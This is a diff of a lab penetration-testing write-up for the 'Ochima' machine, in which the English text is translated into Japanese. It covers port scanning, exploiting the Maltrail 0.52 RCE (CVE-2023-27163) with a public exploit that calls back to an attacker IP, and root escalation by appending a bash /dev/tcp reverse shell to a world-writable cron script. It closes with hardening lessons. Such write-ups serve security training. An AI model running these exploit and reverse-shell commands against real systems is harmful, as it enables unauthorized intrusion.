@@ -16,14 +16,14 @@ alt_en: /posts/pg-ochima/
 | OS | Linux |
 | 難易度 | 記録なし |
 | 攻撃対象 | 22/tcp (SSH), 80/tcp (Apache), 8338/tcp (Maltrail 0.52) |
-| 主な侵入経路 | Maltrail 0.52 unauthenticated RCE (CVE-2023-27163) |
-| 権限昇格経路 | Writable root cron script at `/var/backups/etc_Backup.sh` |
+| 主な侵入経路 | Maltrail 0.52 未認証 RCE (CVE-2023-27163) |
+| 権限昇格経路 | `/var/backups/etc_Backup.sh` への書き込み可能な root の cron スクリプト |
 
 ## 偵察
 
-### 1. PortScan
+### 1. ポートスキャン
 
-We begin with a fast full-range TCP scan to identify all open ports before deep enumeration. RustScan is useful here because it quickly identifies reachable ports and reduces overall recon time. At this stage, we are specifically looking for exposed management services and unusual web ports that may host custom applications.
+詳細な列挙の前に、すべての開放ポートを特定するためにフルレンジの高速 TCP スキャンから始めます。RustScan は到達可能なポートを素早く特定し、全体的な偵察時間を短縮するのに有用です。この段階では、公開された管理サービスやカスタムアプリケーションをホストしている可能性のある通常とは異なる Web ポートを具体的に探します。
 
 ```bash
 rustscan -a $ip -r 1-65535 --ulimit 5000
@@ -50,7 +50,7 @@ Open 192.168.178.32:80
 
 ```
 
-After identifying open ports, we run a full-service Nmap scan to fingerprint versions and HTTP technologies. The command includes aggressive service detection (`-sCV -sV -A`) and disables host discovery (`-Pn`) to avoid missing targets behind filtering. The goal is to detect vulnerable software versions and route exploitation decisions using verified banner data.
+開放ポートを特定した後、バージョンと HTTP 技術をフィンガープリントするために完全なサービス Nmap スキャンを実行します。コマンドには積極的なサービス検出 (`-sCV -sV -A`) が含まれており、フィルタリングの背後にあるターゲットを見落とさないようにホスト探索を無効化 (`-Pn`) します。目的は、脆弱なソフトウェアバージョンを検出し、確認されたバナーデータを使用して攻撃の決定を行うことです。
 
 ```bash
 timestamp=$(date +%Y%m%d-%H%M%S)
@@ -106,19 +106,19 @@ Scan result saved to: /home/n0z0/work/scans/<scan_output>.xml
 
 ```
 
-The key discovery here is `Maltrail/0.52` on port `8338`. This version is associated with CVE-2023-27163, an unauthenticated command injection issue in the web interface that allows remote code execution by manipulating request parameters. That finding defines the fastest and most reliable initial access path.
+ここでの主要な発見はポート `8338` の `Maltrail/0.52` です。このバージョンは CVE-2023-27163 に関連しており、リクエストパラメータを操作することでリモートコード実行を可能にする Web インターフェースの未認証コマンドインジェクションの問題です。この発見により、最速かつ最も確実な初期アクセスパスが定まります。
 
 ![Maltrail web interface showing version 0.52 on port 8338](/assets/img/pg/ochima/Pasted%20image%2020260301091820.png)
-*Caption: Maltrail interface confirming version 0.52 before exploitation.*
+*キャプション: 攻撃前に Maltrail インターフェースでバージョン 0.52 を確認。*
 
-💡 なぜ有効か  
-Version-based vulnerability validation is effective when service banners and exploit target versions align cleanly. By confirming the exact application and exposed endpoint first, we avoid noisy brute-force attempts and move directly into a deterministic exploit path.
+💡 なぜ有効か
+バージョンベースの脆弱性検証は、サービスバナーと攻撃対象バージョンが綺麗に一致する場合に有効です。正確なアプリケーションと公開エンドポイントを最初に確認することで、ノイズの多いブルートフォース試行を回避し、決定論的な攻撃パスに直接移行できます。
 
 ## 初期足がかり
 
-### Exploiting Maltrail 0.52 (CVE-2023-27163)
+### Maltrail 0.52 の悪用 (CVE-2023-27163)
 
-With Maltrail identified, we test known public exploit code for the vulnerable branch. This step attempts to force command execution on the target and trigger a callback to the attacker host. We focus on whether the target reaches our listener, which is the most direct indicator that code execution succeeded.
+Maltrail を特定したら、脆弱なブランチの既知の公開エクスプロイトコードをテストします。このステップではターゲット上でのコマンド実行を強制し、攻撃者ホストへのコールバックをトリガーしようとします。コード実行成功の最も直接的な指標であるターゲットがリスナーに到達するかどうかに焦点を当てます。
 
 ```bash
 python3 exploit.py 192.168.45.166 80 http://192.168.178.32:8338
@@ -131,7 +131,7 @@ python3 exploit.py 192.168.45.166 80 http://192.168.178.32:8338
 
 ```
 
-To receive the payload callback, we run a Netcat listener on the expected port. At this point we are looking for an inbound connection from the target and an interactive prompt. A successful callback confirms initial shell access under the service account context.
+ペイロードのコールバックを受け取るために、期待されるポートで Netcat リスナーを実行します。この時点でターゲットからのインバウンド接続とインタラクティブプロンプトを探しています。コールバックの成功により、サービスアカウントコンテキストでの初期シェルアクセスが確認されます。
 
 ```bash
 nc -lvnp 80
@@ -146,7 +146,7 @@ $
 
 ```
 
-After landing the shell, we immediately validate user-level proof access. The objective is to confirm filesystem reach and collect `local.txt` as evidence of foothold completion. We suppress permission-denied noise during path discovery for faster triage.
+シェルを取得したら、すぐにユーザーレベルの証拠アクセスを検証します。目的はファイルシステムへの到達を確認し、足がかり完了の証拠として `local.txt` を取得することです。パス探索中はより速いトリアージのためにパーミッション拒否のノイズを抑制します。
 
 ```bash
 find / -iname local.txt 2>/dev/null
@@ -161,14 +161,14 @@ e3c3b4d04707e71073979ac1051c2375
 
 ```
 
-💡 なぜ有効か  
-CVE-2023-27163 enables command execution without prior authentication when the vulnerable Maltrail endpoint is reachable. Once arbitrary command execution is established, a reverse shell provides a stable interactive channel to continue local enumeration and escalation.
+💡 なぜ有効か
+CVE-2023-27163 は、脆弱な Maltrail エンドポイントに到達可能な場合、事前認証なしでコマンド実行を可能にします。任意のコマンド実行が確立されると、リバースシェルはローカル列挙と権限昇格を続けるための安定したインタラクティブチャネルを提供します。
 
 ## 権限昇格
 
-### Abusing Writable Root Cron Script
+### 書き込み可能な root の cron スクリプトの悪用
 
-The next step is to identify privileged scheduled tasks that can be influenced from the low-privilege shell. Process-monitoring output shows a root-owned cron execution chain invoking `/var/backups/etc_Backup.sh`. We are specifically looking for script paths that are writable by the compromised user.
+次のステップは、低権限シェルから影響を与えられる特権スケジュールタスクを特定することです。プロセス監視の出力は、`/var/backups/etc_Backup.sh` を呼び出す root 所有の cron 実行チェーンを示しています。侵害されたユーザーが書き込み可能なスクリプトパスを具体的に探します。
 
 ```bash
 2026/03/01 00:31:01 CMD: UID=0     PID=13017  | tar -cf /home/snort/etc_backup.tar /etc
@@ -178,7 +178,7 @@ The next step is to identify privileged scheduled tasks that can be influenced f
 
 ```
 
-Once the job is identified, we inspect the script to understand what root is executing. This confirms whether the file is a practical injection target and whether our payload can persist long enough to trigger. The script currently performs a backup operation with `tar`.
+ジョブを特定したら、スクリプトを調査して root が何を実行しているかを理解します。これにより、ファイルが実際のインジェクションターゲットであるかどうか、そしてペイロードがトリガーするまで十分長く持続できるかどうかを確認します。スクリプトは現在 `tar` でバックアップ操作を実行しています。
 
 ```bash
 cat /var/backups/etc_Backup.sh
@@ -190,7 +190,7 @@ snort@ochima:/tmp$ cat /var/backups/etc_Backup.sh
 tar -cf /home/snort/etc_backup.tar /etc
 ```
 
-Before modifying anything, we verify file permissions to confirm write access from the compromised account. The attack only works if we can alter content that root executes on schedule. Here, world-writable permissions make the escalation path straightforward.
+何かを変更する前に、侵害されたアカウントからの書き込みアクセスを確認するためにファイルパーミッションを検証します。攻撃は、root がスケジュールで実行するコンテンツを変更できる場合にのみ機能します。ここでは、誰でも書き込み可能なパーミッションにより権限昇格パスが単純明快です。
 
 ```bash
 ls -la /var/backups/etc_Backup.sh
@@ -201,7 +201,7 @@ snort@ochima:/tmp$ ls -la /var/backups/etc_Backup.sh
 -rwxrwxrwx 1 root r
 ```
 
-After confirming write access, we append a reverse shell payload to the cron-executed script. This causes root to execute our command on the next cron run. We immediately review the file to ensure the payload was appended correctly.
+書き込みアクセスを確認した後、cron が実行するスクリプトにリバースシェルペイロードを追記します。これにより、次の cron 実行時に root が私たちのコマンドを実行します。ペイロードが正しく追記されたことを確認するために、すぐにファイルを確認します。
 
 ```bash
 echo '/bin/bash -i >& /dev/tcp/192.168.45.166/80 0>&1'>>/var/backups/etc_Backup.sh
@@ -217,7 +217,7 @@ tar -cf /home/snort/etc_backup.tar /etc
 
 ```
 
-We then listen again for the callback, this time expecting a root-level shell because cron executes the script as UID 0. The key indicator is the shell prompt identity and command privileges. A root prompt confirms successful privilege escalation.
+次にコールバックを再度リッスンします。今回は cron がスクリプトを UID 0 として実行するため、root レベルのシェルを期待します。主要な指標はシェルプロンプトの識別子とコマンド権限です。root プロンプトにより権限昇格の成功が確認されます。
 
 ```bash
 nc -lvnp 80
@@ -233,7 +233,7 @@ bash: no job control in this shell
 root@ochima:~#
 ```
 
-Finally, we validate full compromise by reading `proof.txt` from root's home directory. This confirms both filesystem and privilege objectives are complete. The command is simple but serves as final exploitation evidence.
+最後に、root のホームディレクトリから `proof.txt` を読み取ることで完全な侵害を検証します。これによりファイルシステムと権限の両方の目標が完了したことが確認されます。コマンドは単純ですが、最終的な攻撃成功の証拠として機能します。
 
 ```bash
 cat /root/proof.txt
@@ -245,8 +245,8 @@ cat /root/proof.txt
 39da7501d16cfd741104861ccb4f7eb4
 ```
 
-💡 なぜ有効か  
-This escalation path is a classic scheduled-task trust boundary failure: root executes a script that unprivileged users can modify. Because cron preserves root execution context, injected commands inherit UID 0 and spawn a privileged shell without requiring local kernel exploits.
+💡 なぜ有効か
+この権限昇格パスは、スケジュールタスクの信頼境界の典型的な失敗です: root が非特権ユーザーが変更可能なスクリプトを実行しています。cron は root の実行コンテキストを保持するため、インジェクションされたコマンドは UID 0 を継承し、ローカルカーネルエクスプロイトなしに特権シェルを生成します。
 
 ## 認証情報
 
@@ -256,10 +256,10 @@ This escalation path is a classic scheduled-task trust boundary failure: root ex
 
 ## まとめ・学んだこと
 
-- Confirming exact service versions during recon can reveal direct unauthenticated RCE paths with minimal brute-force effort.
-- Internet-facing admin/monitoring services should be patched quickly; vulnerable versions can collapse the entire attack chain.
-- Root cron jobs must never execute scripts writable by non-root users.
-- Scheduled scripts should be permission-hardened (`root:root`, mode `700` or stricter) and monitored for unauthorized changes.
+- 偵察中に正確なサービスバージョンを確認することで、最小限のブルートフォース努力で直接的な未認証 RCE パスを発見できます。
+- インターネットに公開された管理・監視サービスは迅速にパッチを適用すべきです。脆弱なバージョンは攻撃チェーン全体を崩壊させる可能性があります。
+- root の cron ジョブは非 root ユーザーが書き込み可能なスクリプトを絶対に実行すべきではありません。
+- スケジュールスクリプトはパーミッションを強化し（`root:root`、モード `700` 以上）、不正な変更を監視すべきです。
 
 ```mermaid
 flowchart LR
